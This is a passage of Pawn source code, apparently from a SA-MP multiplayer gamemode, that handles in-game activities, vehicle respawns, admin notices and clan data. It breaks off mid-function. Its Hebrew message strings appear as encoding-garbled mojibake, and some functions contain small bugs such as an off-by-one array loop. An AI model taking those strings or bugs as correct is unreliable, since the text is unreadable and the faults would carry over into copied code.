//=[AmmunationSaleName]=========================================================
stock AmmunationSaleName()
{
	new ret[M_S];
	if(!ammusale[1])
	{
		for(new i = 0; i < sizeof(Ammunation); i++) if(GetWeaponSlot(Ammunation[i][aID]) == ammusale[2]) format(ret,sizeof(ret),!strlen(ret) ? ("%s%s") : ("%s / %s"),ret,Ammunation[i][aName]);
	}
	else format(ret,sizeof(ret),Ammunation[ammusale[2]][aName]);
	if(!ammusale[1]) switch(ammusale[0])
	{
		case ammusale_freeone: format(ret,sizeof(ret)," !хўсьх ючёЁщ· ЁхёЇ· счщЁэ %s ўЁх р· рчу юфЁ∙ўщэ",ret);
		case ammusale_half: format(ret,sizeof(ret)," !Ёщ·Ёщэ Єы∙щх ьўЁщщф счЎщ ючщ° %s ыь фЁ∙ўщэ",ret);
	}
	else switch(ammusale[0])
	{
		case ammusale_freeone: format(ret,sizeof(ret)," !хўсьх ючёЁщ· ЁхёЇ· счщЁэ %s ўЁх р· фЁ∙ў",ret);
		case ammusale_half: format(ret,sizeof(ret)," !Ёщ·я Єы∙щх ьўЁщщф счЎщ ючщ° %s фЁ∙ў",ret);
	}
	return ret;
}
//=[ExplosionEffect]============================================================
stock ExplosionEffect(playerid,interval,Float:x,Float:y,Float:z,vw=world_normal) return SetTimerEx("ObjectTimerAct",interval,0,"iiiii",CreateSObject(18680,x,y,z,0.0,0.0,0.0,object_show_distance,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid)),0,0,1,vw), 1;
//=[Flying]=====================================================================
stock StartFlying(playerid) return CallRemoteFunction("StartFlying","i",playerid);
stock StartFlyingC(playerid) return CallRemoteFunction("StartFlyingN","i",playerid);
stock StopFlying(playerid) return CallRemoteFunction("StopFlying","i",playerid);
stock TestFlying(playerid) return CallRemoteFunction("TestFlying","i",playerid);
stock TestFlyingC(playerid) return CallRemoteFunction("TestFlyingN","i",playerid);
stock IsFlying(playerid) return CallRemoteFunction("IsFlying","i",playerid);
//=[RespawnAllVehicles]=========================================================
stock RespawnAllVehicles(playerid)
{
	new bool:hasPlayers[MAX_VEHICLES] = {false,...}, invalids = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) hasPlayers[GetPlayerVehicleID(i)] = true;
 	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) if(!IsPlayerInAnyVehicle(i))
 	{
 	    if(playerinfo[i][vtele3] == 1) DestroyObject(playerinfo[i][vehicle][7]),playerinfo[i][vtele3] = 0;
	}
	for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid] && v != pirateVehicle)
	{
		if(hasPlayers[v]) continue;
		SetVehicleToRespawn(v);
		LinkVehicleToInterior(v,vehicleinfo[v][veint]);
		SetVehicleVirtualWorld(v,vehicleinfo[v][veworld]);
		if(invalids > 0) invalids = 0;
	}
	else if(++invalids >= 50) break;
	new string[M_S];
	format(string,sizeof(string)," *** .%s фхЇЄь °щёш ь°ысщэ Єь щущ",playerid == INVALID_PLAYER_ID ? (botname) : (GetName(playerid)));
	SendClientMessageToAll(green,string);
	return 1;
}
//=[TeamDefines]================================================================
stock TeamDefines(playerid)
{
	new toset = NO_TEAM;
	if(playerinfo[playerid][inmanhunt] && manhuntinfo[0]) toset = (manhuntinfo[5] == playerid ? NO_TEAM : ManhuntTypes[manhuntinfo[4]][mhAntiTK]);
	else if(playerinfo[playerid][inteamact] && teamactinfo[0]) toset = TeamActivities[teamactinfo[4]][taAntiTK];
	else if(playerinfo[playerid][tdmzone] != tdmz_none) toset = playerinfo[playerid][tdmclick][1];
	else if(playerinfo[playerid][clan] > 0) toset = (claninfo[playerinfo[playerid][clan]][csystems][clansys_tk] && claninfo[playerinfo[playerid][clan]][csystemparam][clansys_tk] ? playerinfo[playerid][clan] : NO_TEAM);
	else toset = NO_TEAM;
	SetPlayerTeam(playerid,toset);
	return 1;
}
//=[GetWeaponPickupModel]=======================================================
stock GetWeaponPickupModel(weaponid)
{	// by BenDeLoCo, improved by me
	new ws[47] = {0,331,333,334,335,336,337,338,339,341,321,322,323,324,325,326,342,343,345,346,34,370,346,347,348,349,350,351,352,353,355,356,372,357,358,359,360,361,362,363,36,365,366,367,368,369,371};
	for(new w = 0; w <= sizeof(ws); w++) if(weaponid == w) return ws[w];
    return 0;
}
//=[NumberPlateName]============================================================
stock NumberPlateName(playerid)
{
	new ret[MAX_PLAYER_NAME], newret[64], bool:exp;
	format(ret,sizeof(ret),GetName(playerid));
	newret = "";
	for(new i = 0, len = strlen(ret); i < len; i++)
	{
		exp = (ret[i] >= 65 && ret[i] <= 90) || (ret[i] >= 97 && ret[i] <= 122) || (ret[i] >= 48 && ret[i] <= 57);
		if(!exp && (!i || i == len-1)) continue;
		format(newret,sizeof(newret),"%s%c",newret,exp ? ret[i] : ' ');
	}
	format(newret,sizeof(newret),"{%s}%s",HexStringOfColor(GetPlayerColor(playerid)),newret);
	return newret;
}
//=[EndArmy]====================================================================
stock EndArmy(reason[],adminid)
{
	new string[M_S];
	assert armyinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф Army Game ·ч°х· ф");
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя Army Game ·ч°х· ф",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inarmy] || playerinfo[i][waitarmy]))
		{
			if(playerinfo[i][inarmy])
			{
				SetFreeze(i,0);
				SpawnPlayer(i);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .схшьф Army Game ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙·ч°х· ф");
				GiveMoney(i,join_act,25);
			}
			DestroyVehicleEx(playerinfo[i][armyv]);
			playerinfo[i][inarmy] = 0, playerinfo[i][waitarmy] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	armyinfo[0] = 0, armyinfo[1] = 0, armyinfo[2] = 0, armyinfo[4] = 0;
	KillTimer(armyinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[AdminInfo]==================================================================
stock AdminInfo(playerid,message[],bool:sendcount=false)
{
	if(playerinfo[playerid][admin] == 20) return 1;
	if(!IsPlayerConnected_RealOne(playerid) && IsPlayerConnected(playerid)) TestConnected();
	new string[M_S], a = 0;
	if(IsPlayerConnected(playerid)) format(string,sizeof(string),"[" acname "] " @c(grey) "%s (ID %03d): %s",GetName(playerid),playerid,message);
	else format(string,sizeof(string),"[" acname "] " @c(grey) "Unknown: %s",message);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && !playerinfo[i][silence][sil_dmguard])
	{
		SendClientMessage(i,0x66CCCC,string);
		CheckForSpam(i,sil_dmguard);
		if(!IsPlayerAFK_(i)) a++;
	}
	Log("AdminInfo",playerid,string);
	return sendcount ? a : 1;
}
//=[OutOfActivity]==============================================================
stock OutOfActivity(playerid)
{
	new string[M_S];
	if(raceinfo[0])
	{
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][raceid] = 0;
		PlaySound(playerid,1098);
		RaceTextDraw(playerid,"delete");
		CallRemoteFunction("AllowPrizeUsing","ii",playerid,1);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[GetPlayerVehicleID(playerid)][racedriver] = INVALID_PLAYER_ID;
		raceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(raceinfo[1] < 3) EndRace("чхё° ∙чўЁщэ",-1);
	}
	else if(warinfo[0])
	{
		warinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitwar] = 0, playerinfo[playerid][inwar] = 0, playerinfo[playerid][warid] = 0;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		if(warinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inwar])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~r~war~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !ЁщЎч сюьчю· ф∙°· %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_swar));
					SetPlayerInterior(i,0);
					SpawnPlayer(i);
					playerinfo[i][inwar] = 0, playerinfo[i][waitwar] = 0, playerinfo[i][warid] = 0;
					playerinfo[i][inact] = 0;
					warinfo[0] = 0, warinfo[1] = 0, warinfo[2] = 0;
					playerinfo[i][bonus][3]++;
					if(playerinfo[i][bonus][3] == 5)
					{
						SendClientMessage(i,orange," .Єь ыъ ∙ЁщЎч· с5 юьчюх· ∙°· ўщсь· 10000$");
						GiveMoney(i,10000,9);
						playerinfo[i][bonus][3] = 0;
					}
					else GiveMoney(i,actprize_swar,10);
					KillTimer(warinfo[3]);
					PlaySound(i,1084);
					thereIsAct = false;
				}
			}
		}
	}
	else if(wweinfo[0])
	{
		playerinfo[playerid][waitwwe] = 0, playerinfo[playerid][inwwe] = 0, playerinfo[playerid][wweid] = 0;
		wweinfo[1]--;
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		SetPlayerInterior(playerid,0);
		playerinfo[playerid][inact] = 0;
		for(new i=0;i<2;i++) wwejoins[i] = INVALID_PLAYER_ID;
		PlaySound(playerid,1069);
		if(wweinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i))
				{
					if(playerinfo[i][inwwe])
					{
						format(string,sizeof(string),"%s ~n~~w~is the winner in the ~b~wwe~w~!",GetName(i));
						MovingText(string,mt_activity,GetPlayerColor(i));
						format(string,sizeof(string)," !WWE ЁщЎч с·ч°х· ф %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						act_SaveWin(i,act_Code(aid_wwe));
						SetPlayerInterior(i,0);
						SpawnPlayer(i);
						GiveMoney(i,headserver != i ? actprize_wwe : actprize_wwe*2,10);
						playerinfo[i][inwwe] = 0, playerinfo[i][waitwwe] = 0, playerinfo[i][wweid] = 0;
						playerinfo[i][inact] = 0;
						wweinfo[0] = 0, wweinfo[1] = 0, wweinfo[2] = 0, wweinfo[5] = 0, wweinfo[6] = 0;
						KillTimer(wweinfo[3]);
						PlaySound(i,1069);
						thereIsAct = false;
					}
					else if(playerinfo[i][viewerwwe])
					{
						TogglePlayerSpectating(i,0);
						playerinfo[i][viewerwwe] = 0;
						playerinfo[i][inact] = 0;
						SendClientMessage(i,yellow," !юўххщэ ∙ЁфЁ· ьЎЇх·");
						PlaySound(i,1069);
					}
				}
			}
		}
	}
	else if(kartinfo[0])
	{
		playerinfo[playerid][waitkart] = 0, playerinfo[playerid][inkart] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		DestroyVehicleEx(playerinfo[playerid][kartv]);
		SpawnPlayer(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][kartdriver] = INVALID_PLAYER_ID;
		kartinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1063);
		if(kartinfo[4] > 0) DestroyPickupEx(kartinfo[4]);
		if(kartinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkart])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~g~kart~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !Kart ЁщЎч с·ч°х· ф %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_kart));
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][kartv]);
					SpawnPlayer(i);
					GiveMoney(i,headserver != i ? actprize_kart : actprize_kart*2,10);
					playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
					kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0, kartinfo[4] = 0, kartinfo[5] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kartinfo[3]);
					PlaySound(i,1063);
					thereIsAct = false;
				}
			}
		}
	}
	else if(monsterinfo[0])
	{
		playerinfo[playerid][waitmonster] = 0, playerinfo[playerid][inmonster] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[GetPlayerVehicleID(playerid)][monsterdriver] = INVALID_PLAYER_ID;
		DestroyVehicleEx(playerinfo[playerid][monsterv]);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		monsterinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(monsterinfo[4] > 0) DestroyPickupEx(monsterinfo[4]);
		PlaySound(playerid,1086);
		if(monsterinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inmonster])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~p~monster~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !Monster ЁщЎч с·ч°х· ф %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_monster));
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][monsterv]);
					SpawnPlayer(i);
					GiveMoney(i,headserver != i ? actprize_monster : actprize_monster*2,10);
					playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
					monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0, monsterinfo[4] = 0, monsterinfo[5] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(monsterinfo[3]);
					PlaySound(i,1086);
					thereIsAct = false;
				}
			}
		}
	}
	else if(sraceinfo[0])
	{
		SpawnPlayer(playerid);
		DisablePlayerRaceCheckpoint(playerid);
		playerinfo[playerid][waitsrace] = 0, playerinfo[playerid][insrace] = 0;
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_underwater)) RemovePlayerAttachedObject(playerid,aoslot_underwater);
		sraceinfo[1]--;
		playerinfo[playerid][inact] = 0;
		ToggleWaterWalk(playerid,0);
		if(IsFlying(playerid))
		{
			StopFlying(playerid);
			playerinfo[playerid][gm] = 0;
			SetPlayerHealth(playerid,100.0);
		}
		if(sraceinfo[1] < 3) EndSRace("чхё° ∙чўЁщэ",-1);
	}
	else if(kickstarinfo[0])
	{
		if(playerinfo[playerid][kickstarprize]) playerinfo[playerid][speedup][0] = 0.0, playerinfo[playerid][speedup][1] = 0.0, playerinfo[playerid][speedup][2] = 0.0, playerinfo[playerid][abf][0] = 0, playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID;
		playerinfo[playerid][waitkickstar] = 0, playerinfo[playerid][inkickstar] = 0, playerinfo[playerid][kickstarid] = -1, playerinfo[playerid][kickstarprize] = 0, playerinfo[playerid][kickstarbonus] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		DisablePlayerCheckpoint(playerid);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		kickstarinfo[1]--;
		playerinfo[playerid][inact] = 0;
		if(kickstarinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~r~~h~kickstar~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !Kickstar ЁщЎч с·ч°х· ф %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_kickstar));
					SetPlayerInterior(i,0);
					LinkVehicleToInterior(GetPlayerVehicleID(i),0);
					SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
					DisablePlayerCheckpoint(i);
					SpawnPlayer(i);
					GiveMoney(i,headserver != i ? actprize_kickstar : actprize_kickstar*2,10);
					if(playerinfo[i][kickstarprize]) playerinfo[i][speedup][0] = 0.0, playerinfo[i][speedup][1] = 0.0, playerinfo[i][speedup][2] = 0.0, playerinfo[i][abf][0] = 0, playerinfo[i][abf][1] = INVALID_VEHICLE_ID;
					playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarprize] = 0, playerinfo[playerid][kickstarbonus] = 0;
					kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(kickstarinfo[3]);
					thereIsAct = false;
				}
			}
		}
	}
	else if(ewarinfo[0])
	{
		ewarinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitewar] = 0, playerinfo[playerid][inewar] = 0;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		if(ewarinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inewar])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~g~~h~extra war~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !%s ,ЁщЎч срўёш°ф ххр° %s",ewars[ewarinfo[4]][ewName],GetName(i));
					act_SaveWin(playerid,act_Code(aid_ewar,ewarinfo[4]));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					SpawnPlayer(i);
					GiveMoney(i,headserver != i ? actprize_ewar : actprize_ewar*2,10);
					playerinfo[i][inewar] = 0, playerinfo[i][waitewar] = 0;
					playerinfo[i][inact] = 0;
					ewarinfo[0] = 0, ewarinfo[1] = 0, ewarinfo[2] = 0;
					KillTimer(ewarinfo[3]);
					PlaySound(i,1084);
					thereIsAct = false;
				}
			}
		}
	}
	else if(wargameinfo[0])
	{
		wargameinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitwargame] = 0, playerinfo[playerid][inwargame] = 0;
		playerinfo[playerid][inact] = 0;
		SetPlayerWorldBounds(playerid,20000.0,-20000.0,20000.0,-20000.0);
		PlaySound(playerid,1084);
		if(wargameinfo[1] == 1)
		{
			for(new j=0;j<MAX_PLAYERS_;j++)
			{
				if(IsPlayerConnected(j) && playerinfo[j][inwargame])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~b~~h~%s~w~!",GetName(j),warGames[wargameinfo[4]][wgName]);
					MovingText(string,mt_activity,GetPlayerColor(j));
					format(string,sizeof(string)," !%s-ЁщЎч с %s",warGames[wargameinfo[4]][wgName],GetName(j));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(j,act_Code(aid_wargames,wargameinfo[4]));
					SetPlayerInterior(j,0);
					SpawnPlayer(j);
					playerinfo[j][inwargame] = 0, playerinfo[j][waitwargame] = 0;
					playerinfo[j][inact] = 0;
					wargameinfo[0] = 0, wargameinfo[1] = 0, wargameinfo[2] = 0, wargameinfo[4] = -1;
					GiveMoney(j,headserver != j ? actprize_wargames : actprize_wargames*2,10);
					SetPlayerWorldBounds(j,20000.0,-20000.0,20000.0,-20000.0);
					KillTimer(wargameinfo[3]);
					PlaySound(j,1084);
					thereIsAct = false;
				}
			}
		}
	}
	else if(manhuntinfo[0])
	{
		manhuntinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitmanhunt] = 0, playerinfo[playerid][inmanhunt] = 0, playerinfo[playerid][manhuntid] = 0;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		SetPlayerToNormalColor(playerid);
		if(manhuntinfo[5] == playerid) EndManhunt("рщя ЁщЎху",-1);
		else
		{
			for(new j=0;j<MAX_PLAYERS_;j++)
			{
				if(IsPlayerConnected(j) && playerinfo[j][inmanhunt])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~g~~h~~h~%s~w~!",GetName(j),ManhuntTypes[manhuntinfo[4]][mhName]);
					MovingText(string,mt_activity,GetPlayerColor(j));
					format(string,sizeof(string)," !%s-ЁщЎч с %s",ManhuntTypes[manhuntinfo[4]][mhName],GetName(j));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(j,act_Code(aid_manhunt,manhuntinfo[4]));
					SetPlayerInterior(j,0);
					SpawnPlayer(j);
					playerinfo[j][inmanhunt] = 0, playerinfo[j][waitmanhunt] = 0, playerinfo[j][manhuntid] = 0;
					playerinfo[j][inact] = 0;
					manhuntinfo[0] = 0, manhuntinfo[1] = 0, manhuntinfo[2] = 0, manhuntinfo[4] = -1, manhuntinfo[5] = -1;
					GiveMoney(j,headserver != j ? actprize_manhunt : actprize_manhunt*2,10);
					KillTimer(manhuntinfo[3]);
					PlaySound(j,1084);
					SetPlayerToNormalColor(j);
					thereIsAct = false;
				}
			}
		}
	}
	else if(sportinfo[0]) SportEndForPlayer(playerid,"Ї°∙ юфЇЄщьх·");
	else if(armyinfo[0])
	{
		playerinfo[playerid][waitarmy] = 0, playerinfo[playerid][inarmy] = 0;
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		vehicleinfo[GetPlayerVehicleID(playerid)][armydriver] = INVALID_PLAYER_ID;
		DestroyVehicleEx(playerinfo[playerid][armyv]);
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,0);
		armyinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1086);
		if(armyinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inarmy])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~y~~h~army game~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !Army Game-ЁщЎч с·ч°х· ф %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_army));
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][armyv]);
					SpawnPlayer(i);
                    GiveMoney(i,headserver != i ? actprize_army : actprize_army*2,10);
					playerinfo[i][inarmy] = 0, playerinfo[i][waitarmy] = 0;
					armyinfo[0] = 0, armyinfo[1] = 0, armyinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(armyinfo[3]);
					thereIsAct = false;
				}
			}
		}
	}
	else if(teamactinfo[0])
	{
		new n = playerinfo[playerid][teamactteam] == 1 ? 5 : 6;
		teamactinfo[1]--, teamactinfo[n]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitteamact] = 0, playerinfo[playerid][inteamact] = 0, playerinfo[playerid][teamactid] = -1, playerinfo[playerid][teamactteam] = 0;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		SetPlayerToNormalColor(playerid);
		if(!teamactinfo[n]) TeamActivityWin(n == 5 ? 2 : 1);
	}
	else if(zombiesinfo[0])
	{
		zombiesinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitzombies] = 0, playerinfo[playerid][inzombies] = 0, playerinfo[playerid][zombiesid] = 0, playerinfo[playerid][zombiesweapon] = -1;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		if(zombiesinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inzombies])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~r~zombies~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !ЁщЎч сюьчю· фцхюсщэ %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_zwar));
					SetPlayerInterior(i,0);
					SpawnPlayer(i);
					playerinfo[i][inzombies] = 0, playerinfo[i][waitzombies] = 0, playerinfo[i][zombiesid] = 0, playerinfo[i][zombiesweapon] = -1;
					playerinfo[i][inact] = 0;
					zombiesinfo[0] = 0, zombiesinfo[1] = 0, zombiesinfo[2] = 0;
					GiveMoney(i,headserver != i ? actprize_zombies : actprize_zombies*2,10);
					KillTimer(zombiesinfo[3]);
					thereIsAct = false;
				}
			}
		}
	}
	else if(glassinfo[0])
	{
		glassinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitglass] = 0, playerinfo[playerid][inglass] = 0;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		if(glassinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inglass])
				{
					format(string,sizeof(string),"%s ~n~~w~is the winner in the ~b~glass~w~!",GetName(i));
					MovingText(string,mt_activity,GetPlayerColor(i));
					format(string,sizeof(string)," !ЁщЎч с·ч°х· фтьрё %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					act_SaveWin(i,act_Code(aid_glass));
					SetPlayerInterior(i,0);
					SpawnPlayer(i);
					playerinfo[i][inglass] = 0, playerinfo[i][waitglass] = 0;
					playerinfo[i][inact] = 0;
					glassinfo[0] = 0, glassinfo[1] = 0, glassinfo[2] = 0;
					GiveMoney(i,headserver != i ? actprize_glass : actprize_glass*2,10);
					KillTimer(glassinfo[3]);
					ReloadGlass();
					thereIsAct = false;
				}
			}
		}
	}
	else if(briefcaseinfo[0])
	{
		briefcaseinfo[1]--;
		ResetWeapons(playerid);
		SpawnPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetFreeze(playerid,0);
		playerinfo[playerid][waitbriefcase] = 0, playerinfo[playerid][inbriefcase] = 0;
		playerinfo[playerid][inact] = 0;
		PlaySound(playerid,1084);
		DisablePlayerCheckpoint(playerid);
		playerinfo[playerid][inarea51] = 0;
		if(briefcaseinfo[1] == 1) EndBriefcase("юЄш юущ ю∙··Їщэ",-1);
	}
	else if(actinfo[actExist]) actinfo[actPlayers]--, playerinfo[playerid][inact] = 0;
	if(!thereIsAct)
	{
		if(activityHighScores != INVALID_TEXT_DRAW)
		{
			TextDrawHideForAll(activityHighScores);
			TextDrawDestroy(activityHighScores);
			activityHighScores = INVALID_TEXT_DRAW;
		}
	}
	TeamDefines(playerid);
	SetPlayerToNormalColor(playerid);
	return 1;
}
//=[Decrypt]====================================================================
stock Decrypt(string[])
{   // Pcycho's encrypt
	new ret[32];
	format(ret,sizeof(ret),string);
	for(new i = 0, j = strlen(string); i < j; i++) ret[i] = (string[i]+64231)-12373+97864-21675-58786;
	return ret;
}
//=[SendObject]=================================================================
stock SendObject(model,Float:fromx,Float:fromy,Float:fromz,Float:tox,Float:toy,Float:toz,Float:speed,exp = 0)
{
	new o = CreateSObject(model,fromx,fromy,fromz,0.0,0.0,0.0);
	MoveSObject(o,tox,toy,toz,speed);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (IsPlayerInRangeOfPoint(i,50.0,fromx,fromy,fromz) || IsPlayerInRangeOfPoint(i,50.0,tox,toy,toz))) Streamer_Update(i);
	objectinfo[o][odam] = 1, objectinfo[o][oeam] = exp;
}
//=[IsPlayerUsingDB]============================================================
stock IsPlayerUsingDB(playerid,bool:withsomeone = false)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_PASSENGER) return 0;
	new bool:hassomeone = false;
	if(withsomeone)
	{
		new v = GetPlayerVehicleID(playerid);
		for(new i = 0; i < MAX_PLAYERS_ && !hassomeone; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,v) && GetPlayerState(i) == PLAYER_STATE_DRIVER) hassomeone = true;
	}
    return GetPlayerCameraMode(playerid) == 55 && (!withsomeone || (withsomeone && hassomeone));
}
//=[clanprop]===================================================================
stock clanprop(c,p)
{
	new string[32];
	format(string,sizeof(string),"clan%s%d-%d",claninfo[c][cname],c,p);
	return string;
}
//=[ClanPList_Create]===========================================================
stock ClanPList_Create(clanid)
{
	new f[64], k[16];
	format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
	for(new i = 1; i <= max_clan_members; i++)
	{
		format(k,sizeof(k),"Player%03d",i);
		SetProperty_STR(clanprop(clanid,i),fkeyexist(f,k) ? fgetstring(f,k) : ("None"));
	}
	return 1;
}
//=[ClanPList_Add]==============================================================
stock ClanPList_Add(clanid,playerid)
{
